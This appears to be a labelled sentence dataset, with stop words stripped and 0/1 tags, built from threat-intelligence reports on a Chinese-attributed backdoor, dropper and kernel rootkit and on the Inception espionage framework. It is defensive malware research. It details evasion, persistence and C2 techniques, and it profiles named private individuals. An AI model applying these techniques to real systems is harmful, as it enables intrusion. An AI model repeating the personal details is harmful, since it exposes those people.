In late December 2011 CrowdStrike Inc. received three binary executable files suspected involved sophisticted attack large Fortune 500 company	0
The files analyzed understand first fact malicious level sophistication samples	0
The samples clearly malicious varied sophistication	0
All three samples provided remote access attacker via two Command Control ( C2 ) servers	1
One sample typical commonly referred 'dropper ' primary purpose write malicious component disk connect targeted hosts operating system	1
The malicious component case commonly referred Remote Access Tool ( RAT ) RAT manifested Dynamic Link Library ( DLL ) installed service	1
The second sample analyzed dual use tool function post exploitation tool used infect systems download additional tools remove log data used backdoor	1
The third sample sophisticated implant addition multiple communication capabilities ability act relay infected hosts utilized kernel mode driver hide aspects tool user-mode tools	1
This third component likely used long-term implantation intelligence gathering	1
Some AV engines occasionally identify sample Derusbi Trojan	0
CrowdStrike Intelligence Team seen Trojans 8 different builder variants RAT including 64-bit versions used targeted attacks 2011 Defense Energy/Power Chemical Industries US Japan	0
All samples reflect common toolmarks tradecraft consistent Chinese based actors target various strategic interests United States including High Tech/Heavy Industry Non-Governmental Organizations ( NGOs ) State/Federal Government Defense Industrial Base ( DIB ) organizations vast economic interests	0
This report contains in-depth technical analysis samples detection/remediation/mitigation information attribution intelligence conclusion aimed providing reader synopsis report	0
The executable 14c04f88dc97aef3e9b516ef208a2bf5 commonly referred 'dropper ' designed purpose extracting malicious payload initialize install targeted system	1
In case malicious payload Dynamic-Link Library ( DLL ) enables attacker full control system	1
This code appears compiled Wednesday May 4th 2011 11:04:24 A.M. UTC ( equivalent early evening time China )	0
Note timestamp UTC however relative time day China provided benefit reader	0
The sample first resolves several library functions provided Microsoft using LoadLibrary ( ) GetProcAddress ( ) Application Programming Interfaces ( APIs )	1
The imported function names encrypted ; however function name minutely obfuscated simple single character substitution The dropper invokes SHGetSpecialFolderPath ( ) API supplying Constant Special Item ID List ( CSIDL ) 'CSIDLCOMMONDOCUMENTS ' identify destination folder malicious DLL payload	1
The CSIDL case pints '' The file system directory contains documents common users	0
A typical path C \Documents Settings\All Users\Documents	0
'' The dropper attempts write malicious payload one following names using first available name set The dropper sets creation last written timestamp newly created file date 2007-03-07 00:00:00 ; allows newly created malicious DLL blend system files	1
This meant prevent identification disk forensics using common investigative technique called forensic analysis timeline	1
This date specified dropper code change across multiple infections	0
The malicious DLL file dropped hidden resource dropper binary	1
This relatively common technique used malware dropper files optimize number files required infect machine	0
The resource language malicious DLL set '' Chinese ( Simplified ) '' compiler artifact indicates language setting compiler used person built binary set '' Chinese ( Simplified ) '' time dropper compiled	0
The 'MZ ' header denotes binary executable file dropped DLL initially obfuscated	0
When dropper writes file disk first byte file 'Z ' prevents file executing detected executable many defensive tools	1
The dropper subsequently opens dropped file corrects header writing 'M ' first byte allowing file executed	1
A subroutine decompress dropped file present 'dead code ' ( code used ) binary	0
This subroutine invoked already closed file handle dropped file present code version	0
Since dropped resource compressed routine fails	0
This indicates low sophistication modification original dropper code make work uncompressed source	0
The final step dropper performs load dropped DLL process space ; resolves export 'OpenINFOPerformanceData ' DLL invokes dropped DLL 's filename parameter	1
This export implements actual install logic maintain persistence invoke main routine	1
The dropper binary contains icon resource resembles 'Google Chrome ' browser icon re- source language set '' Chinese ( Simplified ) '' consistent builder tool systems language set Chinese	0
The use Chrome icon may indicate possible attempt socially engineer intended victim thinking dropper legitimate file associated Google	1
This sample 'backdoor ' DLL dropped dropper sample file MD5 14c04f88dc97aef3e9b516ef208a2bf5	1
This code appears compiled Wednesday May 4th 2011 10:48:19 A.M. UTC ( equivalent early evening time China )	0
It instantiated mapped process space dropped file ' export named 'OpenINFOPerformanceData ' called	1
This export first attempts stop service called '' msupdate '' known Microsoft Windows service despite appearance	0
If service present malware replaces previous instances versions backdoor	1
After attempting disable existing service malware tries install service name	1
During installation sample attempts use documented APIs OpenSCManager ( ) CreateService ( ) initialize persistent Windows service	1
As precaution sample writes settings directly Windows Registry accomplish goal installing service documented APIs fails	1
The registry change creates following key Following subroutine set value 'ServiceDLL ' module handle DLL	1
The next key changed HKEYLOCALMACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Svchost 'msupdate ' key set 'msupdate '	1
The export 'CollectW3PerfData ' registered main function DLL	1
If installation new service successful sample starts new service exits	1
If installation fails sample spawns new process using rundll32.exe executable instantiate DLL call specific exported function	1
In case installation failure rundll32.exe calls main functions export 'CollectW3PerfData '	0
The rundll32.exe instantiated new NULL Security Identifier ( SID ) ( S-1-0-0 ) permissions set grant access file	1
This allows user complete control machine rundll32.exe frequently launched tasks changing time wallpaper system settings	1
This means cleaning components dropped malware system remains vulnerable local attacks simply overwriting legitimate rundll32.exe executable malicious version await 's automatic execution Operating System	1
The main entry point DLL named 'CollectW3PerfData ' first creates displays fake Window class '' NOD32 % '' % replaced pseudo-random number	0
This may attempt fool automated dynamic analysis anti-malware software believing legitimate ESET AV software	1
The window however visible implements specific functionality	0
After creating window routine starts main thread eventually initiates calling Command Control ( C2 )	1
In order accomplish task newly created thread initializes networking APIs using WSAStartup ( ) resolves APIs dynamically using LoadLibrary ( ) GetProcAddress ( )	0
Once proper API 's resolved sample assigns NULL SID rundll32.exe executable sets current process ' Window Station '' winsta0 '' enables sample access real user 's desktop started service	1
The communication C2 handled ( ) loop successive connection attempt causing loop invoke Windows Sleep ( ) API time interval 2 seconds exponentially increasing length 1024 seconds ( 17 minutes ) restarting back 2 seconds	1
The C2 location sample statically defined 1.9.5.38:443 ( Malaysia Tmnet Telekom Malaysia Bhd )	0
While ther 'dead code ' download C2 location HTTP URL could defined binary using User-Agent string '' Google '' code activated due format stat- ically defined C2 location using IP address	0
Thus sample attempt connect directly using raw socket C2 located 1.9.5.38:443	1
This indicates use 'boiler plate code ' builder software package automates creation malicious sample	0
The malicious sample sends initial beacon C2 includes following information The beacon encrypted using XOR/ADD loop using statically defined key 0x1C sent C2	1
The following python function used decode beacon stings After sending initial beacon routine loops receiving incoming commands executes sequence	1
When connection successfully established C2 server sleep timer reset two seconds next attempt	0
The network protocol used sample resembles 'Type-Length-Value ' layout directions	0
Each 16 byte request header consists Zero specified bytes additional payload follows header	0
This inbound payload received unconditionally regardless command type fixed-size stack buffer 408 bytes size	1
Providing additional payload larger size result trivial exploitable stack buffer overflow allows arbitrary code execution due absence security features	0
However exploitation vulnerability unnecessary due already available unauthenticated command execution capabilities backdoor	0
Certain commands initiate second connection C2 separate thread using network protocol providing different request command identifier initial beacon	0
The primary aim backdoor remote desktop control functionality comparable VNC Remote Desktop custom protocol	1
It allows adversary view main desktop graphically control keyboard mouse	1
This remote control functionality implemented separate messages mouse clicks pressed keys etc	1
using command identifiers 0x20000002 0x20000019	1
The command 0x22000001 initiates continuous transmission screen captures C2	1
The screen captures created using series Microsoft Windows Graphic Device Interface ( GDI ) API calls culminating call GetDIBits ( )	1
Command 0x20000001 exits backdoor 0x20000000 issued completely remove backdoor system	1
When command 0x23000004 received temporary new user '' DomainUser '' password '' Dom4 nU- serP4ss '' created added local Administrators group	1
The backdoor started account user deleted	1
It would appear technique meant obfuscate activities malicious sample masking process creator 's user name appear generic domain user	1
Note account normally exist Active Directory environment	0
Additionally primary C2 connection allows requests start additional connections C2 imple- menting following functionality This sample typical post exploitation tool ; written .NET	0
2.0	0
This code appears compiled Thursday May 26th 2011 10:21:44 A.M. UTC ( early evening time China )	0
The backdoor functionality instantiated either directly command line commands issued network based protocol via C2	1
If arguments given connection C2 initiated stati- cally defined IP address	1
The command line options support post exploitation capabilities changing file timestamps forensic mitigation privilege escalation launching executable specifying specific C2	1
One interesting command line option allows backdoor filter contents specified files remove content using regular expression ( regex )	1
This command modifies creation modification last access timestamps modified file conceal content modifications	1
A detailed listing command line arguments viewed Appendix A	0
This activity generally associated log cleaning com- plicate forensic investigation	1
The sample contains embedded IP address C2 stored encrypted format string re- source The first two bytes string represent base 16 length encrypted string case '' 0x14 ''	0
Following base64 encoded string specified length	0
Once string decoded using base64 result XOR 'd fixed value 0xAA yielding decoded IP address 202.86.190.3:80 ( Hong Kong TeleOne ( HK ) Limited )	0
There three components protocol Authentication accomplished using 32 byte packet packet consists An example authentication packet sent C2 located Appendix E. After sending initial authentication packet sample verifies first four bytes response equal statically defined value sample value 0x16030100	1
In addition 8 byte key sent client RC4 encrypted using random number generated step 2 password	1
This value transformed using simple algorithm Appendix F 32 byte array	0
The first 16 bytes array used KEY second 16 bytes used IV setting AES encryption used encrypt decrypt communications	1
Beacon typical type malicious sample allows operator separate various infected hosts targeted campaign	0
The beacon sample formatted XML consists An example unencrypted beacon Command handling loop loop structure process execute commands sent C2	1
The malware sends receives heartbeat/keepalive packet every 2 minutes	1
The command format derived structure consisting These fields received sequence serialized .NET	0
objects order specified	0
A detailed description possible values commands Appendix D. It important note order application defines order appear coming network	0
Examples implemented commands include download upload files installing new .NET assemblies calling methods assemblies connecting new C2 servers executing processes	1
This sample sophisticated backdoor implements several communications protocols developed C++	1
This binary compiled /GS flag using Visual Studio 2010 enabling stack buffer overflow detection	0
This code appears compiled Sunday October 30 2011 12:43:33 P.M. UTC ( late evening time China )	0
The code contains several Run Time Type Information ( RTTI ) artifacts indicate C++ class names prefixed string '' PCC '' original source code	0
Variants Trojan sometimes detected name 'Derusbi ' Microsoft Trend Sophos Symantec AV engines	0
This sample DLL registered service used drop kernel driver provide interactive command line shell C2	1
It also able bypass User Account Control ( UAC ) install using 'sysprep.exe ' Microsoft Windows executable provided targeted system	1
The steps takes install onto system follows 2	0
After copies modify creation time last access time last modification time current system time copy made year changed 2005	1
3	0
Adds service name backdoor 's configuration HKEYLOCAL MACHINE\\SYSTEM\\CurrentControlSet\\Services\\ service '' This defaults '' wuauserv '' legitimate Windows Update service given binary 's default configuration	1
4	0
Adds list services started 'netsvc ' using service name 'helpsvc '	1
5	0
If McAfee AV installed creates copy regsvr32.exe named Update.exe schedules copy deleted reboot using well documented MoveFileExA API	1
6	0
It calls either original copy regsvr32.exe parameters /s /u path copy made Step 1	0
The /u parameter means '' uninstall '' calls DllUnregisterServer unsophisticated method DLL entry point obfuscation	0
7	0
DllUnregisterServer installs driver initiates backdoor component	0
The sample capable 'dropping ' embedded/encrypted kernel driver	1
If process '' ZhuDongFangYu	0
exe '' running ( AntiVirus360 program Chinese 'Quihoo 360 Technology Co. LTD ' 360 ) username DLL 's host process context 'SYSTEM ' driver written disk	0
Barring two aforementioned conditions sample decrypts kernel driver Following decryption writing driver disk loaded using ZwLoadDriver ( ) API	1
The driv- er encrypted simple four byte XOR key value 0x2E885Df3 ; decryption file MD5 hash dae6b9b3b8e39b08b10a51a6457444d8	1
The malware contains dynamic configuration stored Registry loads default configuration embedded binary configuration found	0
The way default configuration loaded parsed indicates malware built 'builder ' takes template sample lets unsophisticated user specify configuration without recompiling code	0
If current service name matches set pre-defined service names legitimately exist Windows backdoor loads original service 's DLL address space LoadLibrary invokes ServiceMain export	1
This effectively hijacks original service 's entry retaining functionality	0
While code binary allows downloading list C2 servers HTTP URL default configuration present specifies 202.86.190.3:80 C2 use Hong Kong C2 server one used post exploitation .NET	1
tool	0
The malware three distinct C2 protocols two transmitted HTTP proxies one bundled two different 'dual ' modes ( see 3	1
) totaling 7 distinct supported C2 mechanisms	0
The con- figuration contains C2 protocol used optionally self-configuration mode malware attempts different C2 protocols pre-defined order	1
In self-configuration connection via proxy attempted system wide Internet Explorer settings specify proxy	0
The configuration found sample set automatic self-configuration resulting following mechanisms tried order 1	0
Proprietary binary header ( optionally HTTP Proxy using CONNECT mechanism ) ; protocol consists 64 random bytes sent C2	1
The C2 responds 64 bytes first four bytes must match first four sent bytes establish connection successfully	0
The remaining bytes discarded	0
Interestingly malware stores first four bytes rotated right seven bits compares value seven bits rotated right version server 's response effectively neutralizing rotation 's effect ; purpose unclear	0
2	0
A long-running HTTP POST request path '' /forum/login.cgi '' statically defined HTTP request string including HTTP headers ( optionally HTTP Proxy using CONNECT )	0
The malware requires response start '' HTTP/1.0 200 '' '' HTTP/1.1 200 '' absence '' Connection close '' header	0
This one HTTP connection used bi-directional communications sending chunks POST payload receiving chunks response interleaved	1
3	0
Two long-running HTTP requests C2 ( optionally HTTP Proxy original request verb ) one GET request '' /Photos/Query.cgi ? loginid= '' followed random number one POST request '' /Catelog/login1.cgi ''	0
The GET request serves down-stream channel POST request serves upstream channel	1
This demonstrates attempt use efficient communication channel first falling back legitimate appearing channels required order appear Request For Comment ( RFC ) compliant HTTP protocol	0
Additionally malware contains custom DNS client implementation use system 's configured DNS server tunnel C2 traffic legitimate DNS	1
Since C2 mechanism attempted self-configuration configured binary analysis left due time constraints	0
After establishing aforementioned channels arbitrary binary data exchange malware start sending receiving compressed binary blobs via channel choice	1
The C2 's binary data blobs compressed	0
No encryption data takes place	0
All C2 transport implementations contain code accepting handling server-side connections respective protocols	0
However code appear invoked	0
It appears author code shares library implements transports client C2 server	0
The main backdoor thread reads commands chosen C2 protocol passes following registered handler classes based upon command ID	1
The handler class responsible parsing remainder command	0
This handler class command ID 8 implements generic directory file browsing using FindFirstFileW ( ) FindNextFileW ( ) APIs well reading writing arbitrary files via C2 commands thus enabling upload download arbitrary files	1
This typically seen RATs searching specific files exfiltrate	1
Additionally class implements launching specified executable files via CreateProcess ( ) API	1
This handler class implements generic TCP proxy	1
It supports establishing TCP connections hosts also listening incoming connections	1
The incoming connection contents forwarded C2 data C2 passed connections	1
It supports 1024 parallel connections	0
The malware capable gathering various pieces information system triggered command ID 10	1
The capabilities include recovering authentication credentials various system client storage Mozilla Firefox Internet Explorer Remote Access Service ( RAS )	1
This class also supports gathering intelligence infected system including identifying security tools process name proxy accounts version numbers Operating System ( OS ) Internet Explorer	1
This handler class provides attacker ability manage system components including start / stop / delete system services enumerate / alter registry keys manage running processes	1
This class also provides ability attacker take screen shot users desktop	1
This handler class uses command ID 5 implements interactive command line shell accessible C2 server containing series built-in commands	1
If input list built-in commands malware attempts invoke cmd.exe background launching command command line utility already present system	1
The standard output channel command provided back C2	1
The supported built-in commands The command implemented directly main backdoor thread subprocedure call via generic command handler class command ID 256	0
This command results DLL deleting terminating backdoor process	1
This sample packed 32-bit kernel driver extracted aforementioned DLL MD5 hash de7500fc1065a081180841f32f06a537 sample function Windows 32-bit kernel	0
This code appears compiled Sunday October 9 2011 4:50:31 P.M. UTC ( early morning time Monday October 10 China )	0
This section describes driver performs initialization routine	0
The driver begins opening named event BaseNamedObjects object directory name { 8CB2ff21-0166-4cf1-BD8F-E190BC7902DC } using Windows API ZwOpenEvent ( )	1
If event already exists driver fails load presumably avoid multiple instances	1
If event exist driver creates using Windows API ZwCreateEvent ( )	1
The Windows API creating events ( ZwCreateEvent ( ) CreateEvent ( ) user mode ) already provides ability '' create-or-open '' event use initial ZwOpenEvent superfluous indicative relatively limited Windows API knowledge author part code	0
It interesting note hex digits object name mixed case potentially indicative code re-appropriated another source	0
The second component entry point performs anti-debugging technique calling function KdDisableDebugger ( ) allows driver disable usage built-in Windows kernel debugging facility used popular kernel debuggers KD WinDbg	1
Tools Syser Debugger debugging virtual machine unaffected technique	0
The sample rather importing KdDisableDebugger ( ) API using conventional methods looks API MmGetSystemRoutineAddress ( ) instead	0
All APIs used driver imported normally technique hide import APIs used throughout driver	0
Searching Google '' MmGetSystemRoutineAddress '' '' KdDisableDebugger '' results dozens Chinese language blogs explain use technique '' Disable WinDbg ''	0
The final step entry point begin hooking system done two helper functions - one designed hook system call table hooks network stack	1
The network stack hooking first queries OS version using RtlGetVersion ( ) PsGetVersion ( )	1
Checking version necessary Windows versions beginning Vista utilize redesigned TCP/IP net- work stack hooking operations require different implementation versions	0
On versions prior Windows Vista TCP/IP driver creates \Device\Tcp device object network requests piped	0
On Vista later TCP/IP split multiple components IP connection enumeration driver targeting managed \Device\nsiproxy instead	0
In either case driver obtains device object using IoGetDeviceObjectPointer ( ) hooks Major Function 14 IRPMJDEVICECONTROL function Input Output ConTroLls ( IOCTLs ) sent IOCTL querying active IP connections	1
The NSI hook targets IOCTL 0x12001B used NsiGetObjectAllParameters ( ) nsi.dll users typically run commands netstat.exe use IP Helper APIs iphlpapi.dll	0
The purpose hook scan list active connections returned user hide connection currently bound local TCP port range 40000 45000	1
The hooking performed creating new completion routine associated IRPMJDEVICECONTROL IRP matches IOCTL attaching target process performing several memory copies hide entry detaching	1
This functionality nearly identical code posted Edward Sun ( aka cardmagic sunmy1 @ sina.com onlyonejazz @ hotmail.com cardcian @ mail.ustc.edu.cn QQ # 28025945 ) Hefei Anhui province ( Nanjing Military District ) July 8 2007 China-based researcher Trend Micro ( working Kingsoft Chinese AV Company ; LinkedIn profile page http //www.linkedin.com/profile/view ? id=84082731 ) http //forum.eviloctal.com/viewthread.php ? action=printable & tid=29604 ( See Appendix G )	0
CrowdStrike information connecting Mr. Sun intrusion activity code appears appropriated actor add similar functionality code	0
The TCP hook works almost identically NSI hook though instead hooking IOCTL 0x120003 ( IOCTL TCPQUERYINFORMATIONEX )	1
This IOCTL exact functionality NSI specific IOCTL	0
This IOCTL mechanism used Windows versions prior Windows Vista	0
This hook also filters connections listening TCP ports range 40000 45000	1
The system call hooking targets three functions ZwSaveKey ( ) ZwQueryValueKey ( ) ZwEnumerateValueKey ( )	0
The unpacked kernel driver sample hooks functions reading second DWORD exported functions	1
Because system call stub uses EAX register index system call ID '' mov eax imm32 '' instruction '' instruction used second DWORD match system call ID	0
It adds index value KeServiceDescriptorTable.Base exported kernel variable ( 32-bit Windows ) directly points system call table	0
This one simplest ways system call hook work 64-bit Windows variable exported addition protection provided Microsoft PatchGuard	0
The system call hook performed first allocating Memory Descriptor List ( MDL ) using Windows API IoAllocateMdl ( ) associating MDL non-paged buffer using MmBuildMdlForNonPagedPool ( )	1
Once MDL associated non-paged buffer sample locks underlying pages using Windows API MmProbeAndLockPages ( )	0
Instead hooking entry table directly easily detectable driver uses LDASM open-source disassembly engine analyze function pointed table applying Detours-style hook directly code	1
It uses standard '' mov cr0 eax '' technique turning Write Protect ( WP ) bit	0
When hook installed writes special DWORD value 'KDTR ' allows prevent double-hooking badly-hooking system call unhooking value also checked	0
In ZwSaveKey ( ) hook access \\REGISTRY\\MACHINE\\SYSTEM blocked	0
RegSaveKey ( ) user-mode implementation kernel ZwSaveKey ( ) API typically used performing offline backup particular registry key	0
hook ZwQueryValueValue ( ) hook looks '' Parameters '' key service within registry \\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Services\\	0
It checks values '' ServiceDll '' '' Security '' keys latter case applies XOR data value 127	1
The user-mode component malware service called '' msupdate '' driver attempting hide service	1
The user-mode service stores configuration data '' Security '' subkey RPC registry key component obfuscate user-mode configuration data	0
The driver make efforts hide key specifically check '' RPC '' '' Security '' lead random data obfuscated	0
The final hook ZwEnumerateValueKey ( ) similar structure ZwQueryValueHook key due fact APIs provide almost identical functionality comes reading registry values	0
In registry hooking code driver call made ObReferenceObjectByHandle ( )	1
This allows driver receive 'CMKEYOBJECT ' used ObQueryNameString ( ) get key/value path	0
However call ObDereferenceObject ( ) ever made means registry objects sent APIs eventually leaked	0
In registry hook noticed '' CurrentControlSet001 '' used target target machine using '' last known good '' configuration roaming hardware profile registry hook would function intended	0
This reason Microsoft implemented symbolic link \\CurrentControlSet ensures regardless machines configuration request access correct registry key	0
This threat actor leaves several key fingerprints used identify compromised systems	0
These digital fingerprints unique adversary campaign	0
The following network signatures designed popular Open Source IDS called Snort	0
These signature ported formats upon request	0
The following file system artifacts indicative compromised host The following Windows Registry artifacts indicative compromised host The backdoor may detected several different Anti-Virus products signature name Attribution cyber domain always tricky subject relying solely malicious samples	0
Compiler artifacts language settings course deliberately masked spoofed	0
CrowdStrike uses unique approach comprehensive threat analysis order decipher attributable components	0
Based corroborating evidence discovered course analysis appears numerous indications Chinese-speaking actor	0
ZhuDongFangYu.exe component 360 360􀆔􀆔􀆔􀆔 Chinese security product available http //www.360.cn/	0
This particularly relevant case backdoor DLL sample MD5 de7500fc1065a081180841f32f06a537 specifically avoids installing kernel driver system running tool	1
Speculatively may security product detects rootkit author attempting prevent accidental infection systems running Anti-Virus product	0
The obfuscation KdDisableDebugger ( ) function call seen several Chinese language forums seen reused several code samples forums	0
As previously mentioned advantage associated using call obfuscation appears reused apparent reason attackers copied code directly forum code	0
While various network hooking techniques used kernel driver may appear novel well researched upon close inspection actually line-for-line copy existing post now-offline 'rootkit.com ' Chinese language developer	1
This post currently mirrored dozens Chinese hacking websites	0
Similarly system call hooking less impressive searching '' IoAllocateMdl '' '' cr0 '' ( bbs.pediy	0
com/showthread.php ? t=77467 perform system call hooking MDLs	1
The ldasm inline hooking also repeated numerous postings Chinese forums	0
One particular website ( http //read.pudn.com/downloads197/sourcecode/windows/sys- tem/927802/CCRootkit/RootkitSys/HookSSDT.c.htm ) almost identical ldasm loop tried identify exact code sequences	0
Open source research 4 innocuous kernel APIs '' ZwSaveKey ZwQueryValueKey ZwEnumerateValueKey IoAllocateMdl '' concert leads directly Chinese website cached rootkit performing similar hooks 3 registry related APIs	1
While driver use pool tags allocations utilize networking hooking code much like examples found Chinese language forums	0
This sample uses pool tags 'tnet ' 'KDTR '	0
Although meaning KDTR tag obvious assess high confidence shortened version '' Kernel DeTouR '' coincides matching functionality detour-style inline hook	0
The driver code ( MD5 dae6b9b3b8e39b08b10a51a6457444d8 ) appears combination various code easily searchable Internet almost always attributed Chinese language forums websites	0
The system call hooking parts code appear identical HookSSDT.c code authored Steven Lai 'embedlinux ' utilized author titled 'CC Rootkit ' August 4 2008 's email address hqulyc @ 126.com	0
This user QQ identity 5054-3533 QQ popular instant messaging chat client used almost exclusively China	0
His real name according QQ profile ( http //user.qzone.qq.com/50543533 ) appears Steven Lai	0
He 28 years old ( born September 5 1983 ) lives Xiamen Fujian province ( Nanjing Military Region )	0
According profile worked Xiamen XOCECO New Technic Co. Ltd. ( http //www.likego.com/en/about.asp ) company builds audio/video systems transportation systems	0
Mr. Lai identified actor code however used whomever built kernel driver utilized backdoor reason providing background individual	0
The samples involved incident typical attacks commonly associated People's Republic China ( PRC )	0
These code samples variety Tools Techniques Procedures ( TTPs ) used track identify specific adversary groups	0
The sophistication actor responsible incident difficult quantify without visibility activities transpired victims network	0
The ability conduct Incident Response ( IR ) including forensics log analysis greatly augments visibility aspects incident	0
Some indications adversaries ' capabilities derived captured samples alone	0
The dropper code ( MD5 14c04f88dc97aef3e9b516ef208a2bf5 ) utilize techniques unique unusual consistent tools techniques procedures attacks targeting proprietary information generally attributed PRC	0
The presence dead code replacement simple obfuscation method hide to-be-dropped dll binary file indicates code reuse attacker side	0
The 'dead code ' utilizes sophisticated compression algorithm provided third party rendered useless reason	0
This may result attacker modifying existing tool unknowingly using re-purposed tool	0
The dropper resources indicate compiler used build tool running system utilized Chinese '' Simple '' language pack built Wednesday May 4th 2011 11:04:24 A.M. UTC ( early evening time China )	0
While deliberately spoofed 'false flag ' indicators including C2 consistent work Chinese speaking actor	0
The dropped DLL ( MD5 47619fca20895abc83807321cbb80a3d ) contains functionality typical Remote Access Tool ( RAT ) commonly used PRC based actors data exfiltration attacks	1
The code quality impressive contains trivial stack buffer overflow vulnerability	0
Despite buf- fer overflow C2 channel lacks command authenication encryption apart initial beacon encryption/obfuscation using statically compiled XOR key	0
The sample uses TCP port 443 commu- nication makes attempt mimic SSL protocol typically used port number would provide enhanced Operational Security ( OPSEC )	0
This code appears compiled Wednes- day May 4th 2011 10:48:19 A.M. UTC ( early evening time China )	0
The post exploitation tool ( MD5 2dce7fc3f52a692d8a84a0c182519133 ) dual-use tool dropped executed client-side exploit adversary launch using variety command line options	1
This tool built Microsoft .NET	0
framework typically indication less sophis- ticated attacker .NET	0
easier develop requires .NET	0
framework present victim machine	0
The tool appears compiled Thursday May 26th 2011 10:21:44 A.M. UTC ( early evening time China )	0
The sample utilizes AES cryptographic algorithm protect C2 communications	1
This DLL moderately sophisticated backdoor several well designed communication mechanisms typically seen types implants	1
The code base sample developed C++	0
The code appears compiled Sunday October 30 2011 12:43:33 P.M. UTC ( late evening time China )	0
This sample multiple communication capabilities available makes far versatile stealthy	1
It implements relatively well thought protocols including HTTP DNS	1
The tool ability automatically select effective communication channel instantiated help avoid detection solutions like DNS blacklisting RFC protocol enforcement	1
The DLL contains traces original C++ class names utilized source code general prefixed 'PCC '	0
The sample supports ability act generic proxy may intended proxy C2 traffic infected machines order minimize number systems communicating C2 thus enhancing OPSEC	1
The sample contains 'dead code ' appears command control server classes likely indicator C2 client would communicate sample shares communications library compiled sample	1
The kernel driver component dropped Backdoor DLL bears many tool marks associating CCRootkit package publicly Steven Lai ( a/k/a embedlinux )	1
This kernel mode rootkit implements several hooking techniques aimed preventing system administrator detecting backdoor DLL	1
The implementation techniques unique idiosyncrasies permit direct attribution source code Steven Lai posted	0
This driver attempts hide wide swath TCP ports ( 40000-45000 ) unknown reason however suspected may relate potential network relaying capability alluded backdoor dll	1
The kernel driver component dropped Backdoor DLL bears many tool marks associating CCRootkit package publicly Steven Lai ( a/k/a embedlinux )	1
This kernel mode rootkit implements several hooking techniques aimed preventing system administrator detecting backdoor DLL	1
The implementation techniques unique idiosyncrasies permit direct attribution source code Steven Lai posted	0
This driver attempts hide wide swath TCP ports ( 40000-45000 ) unknown reason however suspected may relate potential network relaying capability alluded backdoor dll	1
Implemented values cmdID follows cmdType one following ( Interesting commands explained detail ) string0 one following values dependant upon command id type	0
cardmagic writes Windows Vista changed alot network module many old port hiding materials longer usable	0
In post I share simple code hide port Vista hope useful guys	0
Actually Windows Vista netstat.exe call InternalGetTcpTable2 exported Iphlpapi.dll list open ports InternalGetTcpTable2 transfer control NsiAllocateAndGetTable exported nsi.dll finally nsi.dll involve NsiEnumerateObjectsAllParametersEx interact kernel mode module NSI -- nsiproxy.sys	0
nsiproxy.sys almost like wrapper netio.sys call internal subroutines netio.sys	0
Here use relatively easy way -- '' NSI Kernel Module Dispatch Routine Hook '' demonstrate specified port hiding uner Vista	0
Dispatch routine hook old topic time apply method nsiproxy.sys	0
Blue Coat researchers uncovered previously-undocumented highly automated extremely sophisticated framework performing targeted attacks	0
The framework notable number reasons including ( limited ) use cloud-based infrastructure command-and-control use WebDAV protocol send instructions receive exfiltrated information compromised systems	1
Initial malware components embedded Rich Text Format ( RTF ) files	0
Exploitation vulnerabilities file format leveraged gain remote access victim 's computers	1
The framework thus far using services cloud service provider based Sweden CloudMe.com main command-and-control infrastructure	1
Malware payloads designed wide array potential devices including home routers mobile devices running iOS BlackBerryOS Android also recovered course research	0
The framework designed way post-infection communication ( i.e target surveying configuration updates malware updates data exfiltration ) performed via cloud service	1
The malware components framework follow plugin model new malware rely previously delivered malware components interact framework	0
Initial attacks largely focused Russia Eastern European countries	0
However later seen attackers interested targets globe	0
The framework target-agnostic seems highly automated	0
The operational security exhibited attackers good - among best seen	0
Most interaction attackers infrastructure performed via convoluted network router proxies rented hosts	1
Although attackers left clues unable provide attribution degree accuracy	0
The use software vulnerabilities order execute malicious software unsuspecting users ' computers important parameter monitor	0
This method attack known considerable success rate also often deployed resourceful attackers marks threat worth paying attention	0
The use exploits document formats like PDF DOC RTF ways especially noteworthy	0
Documents commonly exchanged via mail make perfect email-borne targeted attacks ; otherwise known spear phishing	0
In March 2014 Microsoft published information new vulnerability Rich Text Format ( RTF )	0
This vulnerability named CVE-2014-1761 ( Microsoft Word RTF Object Confusion ) already used effectively attackers time announcement	0
Two previous vulnerabilities RTF file format known CVE-2010-3333 CVE-2012-0158 become time mainstays targeted attacks tracked attackers implemented new exploit keen interest	0
By late August identified malware espionage operation used CVE-2014-1761 CVE-2012-0158 vulnerabilities trigger execution malicious payload leveraged single cloud service backbone entire visible infrastructure	0
When examined suspicious documents discovered somewhat anomalous compared run-of-the-mill material	0
They turned belong highly advanced professional targeted attack framework utilized complex series techniques survey potential targets	1
Due many levels obfuscation indirection named Inception framework ; ends similarity movie name	0
Leonardo DiCaprio associated investigation	0
We initially knew little actual targets ; apart one	0
In particular case actual phishing email knew apparent recipient – CEO large Russian bank	1
The email apparently sent '' Mrs. World '' ; note Mrs. Miss - World	0
We soon discovered malware repository contained several similar documents come sources include email message identifiable information targets	0
However text documents covered variety topics mostly revolving around Russian issues relating variety business sectors	0
The following pages highlight representative selection documents	0
All documents found far rather standard Word documents old 97-2003 compatible format based OLE2	0
Such documents typically contain quite bit metadata The name document creator ; user edited recently ; name company whose copy Word used create document et al	0
Users optionally configure Word remove metadata document saved 's exactly creator documents stripping potential source attribution data	0
However Word documents format contain additional information know look	0
All Word documents format contain 's known File Information Block ( FIB )	0
The FIB contains information file 's internal structure also – extent – data program used create file	0
In case samples analyzed documents saved using build Microsoft Word Office14 ( better known Office 2010 )	0
In addition documents contain slack space old data remains	0
For example decoy came attack named '' Organigrama Gobierno Rusia.doc '' contains Visual Basic leftovers indicating originally created computer configured used native Spanish speaker apparently advisor Spanish Embassy Moscow	0
This document presumably obtained attackers repurposed attack	1
Despite limited information disposal targets attacks content reveals context possible targets may	0
First decoy documents indicate interest We also set phishing mails targeted The shellcode used pretty standard variant previously used number campaigns typically operating China minor changes	1
The malicious content stored inside document encoded form shellcode decodes writes disk	1
Upon successful execution code drops Word document Visual Basic script	1
The Word document displayed user avoid arousing suspicion script executed background	1
Unusual many exploit campaigns names dropped files vary ; example HyHa9AJ.vbs ewRg.vbs 0QHdN.vbs etc	1
– clearly randomized order avoid detection name	1
The VBScript dropper code also little unusual	0
It declares Windows Management Instrumentation ( WMI ) object order reach components like registry file system	0
This seems adapted Microsoft example code like one found http //msdn.microsoft.com/en-us/library/aa387236 ( v=vs.85 ) .aspx	0
When VBSript run drops two files disk	1
One polymorphed dll file binary data file obvious internal structure	0
This data file turns encrypted using AES-256	1
The files installed several locations These locations vary operating system versions	1
The VBScript sets startup key '' HKCU\Software\Microsoft\Windows\CurrentVersion\Run '' registry path execute DLLs boot time	1
